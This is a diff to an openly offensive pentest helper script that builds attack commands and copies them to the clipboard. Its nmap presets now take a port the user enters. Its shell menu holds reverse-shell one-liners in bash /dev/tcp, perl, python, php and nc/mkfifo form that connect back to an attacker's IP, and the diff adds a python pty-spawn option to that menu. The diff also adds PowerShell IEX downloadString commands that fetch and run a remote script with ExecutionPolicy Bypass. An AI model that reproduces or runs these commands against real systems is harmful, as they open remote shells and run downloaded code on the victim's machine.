@@ -67,9 +67,13 @@ def get_url():
     return choice
 
 def nmap():
+    print("Please enter the port for nmap to scan. Leave blank to use default")
+    ports = input("Input: ").strip()
+    if ports == "":
+        ports = "[edit port]"
     options = {1 : f"nmap -sSV -Pn -nvv -p- --reason -T4 -oN {store_directory}/{target_ip}_nmap_tcp_ports.txt {target_ip}",
-        2: f"nmap -sSV -sC -Pn -nvv -p[edit port] -A --version-intensity 9 -O --reason -T4 -oN {store_directory}/{target_ip}_nmap_detailed.txt {target_ip}",
-        3: f"nmap -A -O --script vuln -p25,22,111,145,139 -oN {store_directory}/{target_ip}_nmap_vuln_scan.txt {target_ip}",
+        2: f"nmap -sSV -sC -Pn -nvv -p{ports} -A --version-intensity 9 -O --reason -T4 -oN {store_directory}/{target_ip}_nmap_detailed.txt {target_ip}",
+        3: f"nmap -A -O --script vuln -p{ports} -oN {store_directory}/{target_ip}_nmap_vuln_scan.txt {target_ip}",
         4: f"nmap -Pn -p- -sU --stats-every 3m --max-retries 2 -T4 -oN {store_directory}/{target_ip}_nmap_udp_ports.txt {target_ip}",
         5: f"nmap -T4 -sV --script=firewalk.nse -oN {store_directory}/{target_ip}_nmap_firewalk.txt {target_ip}"
     }
@@ -244,13 +248,14 @@ def sqlmap():
     
     copy_to_clipboard(options)
 
-def reverse_shell():
+def shell():
     options = {1 : f"bash -i >& /dev/tcp/{source_ip}/{local_port} 0>&1",
         2 : """perl -e 'use Socket;$i="%s";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'""" % (source_ip, local_port),
         3 : f"""python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{source_ip}",{local_port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'""",
         4 : f"""php -r '$sock=fsockopen("{source_ip}",{local_port});exec("/bin/bash -i <&3 >&3 2>&3");'""",
         5 : f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {source_ip} {local_port} >/tmp/f",
         6 : f"xterm -display {source_ip}:1",
+        7 : f"""python -c 'import pty; pty.spawn("/bin/bash")'"""
     }
     
     copy_to_clipboard(options)
@@ -331,6 +336,14 @@ def change(source, target, port):
         else:
             continue
 
+def powershell():
+    options = {1 : f"powershell IEX(New-Object Net.WebClient).downloadString('http://{source_ip}/file.ps1')",
+        2 : f"powershell -version 2 IEX(New-Object Net.WebClient).downloadString('http://{source_ip}/file.ps1')",
+        3 : f"IEX(New-Object Net.WebClient).downloadString('http://{source_ip}/file.ps1')",
+        4 : f"powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File file.ps1",
+    }
+    
+    copy_to_clipboard(options)
 # map the inputs to the function blocks
 options = {"nmap" : nmap,
            "hydra" : hydra,
@@ -347,7 +360,7 @@ options = {"nmap" : nmap,
            "wpscan": wpscan,
            "sshuttle": sshuttle,
            "sqlmap": sqlmap,
-           "reverse_shell" : reverse_shell,
+           "shell" : shell,
            "mysql" : mysql,
            "dig" : dig,
            "enum4linux": enum4linux,
@@ -355,6 +368,7 @@ options = {"nmap" : nmap,
            "mount": mount,
            "plink": plink,
            "tcpdump": tcpdump,
+           "powershell": powershell
 }
 while True:
     print("You are currently in tool selection mode.")
